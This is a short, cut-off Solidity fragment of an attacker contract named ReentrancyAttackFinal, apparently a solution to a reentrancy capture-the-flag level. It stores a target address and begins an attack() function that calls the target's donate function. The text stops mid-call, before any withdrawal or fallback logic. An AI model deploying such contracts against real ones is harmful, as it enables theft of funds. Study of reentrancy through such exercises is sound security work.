pragma solidity ^0.6.12;

contract ReentrancyAttackFinal {
    address public reentrance;
    uint256 public counter = 0;

    constructor(address _reentrance) public {
        reentrance = _reentrance;
    }

    function attack() external payable {
        (bool success, ) = reentrance.call(abi.encodeWithSignature("donate(address)\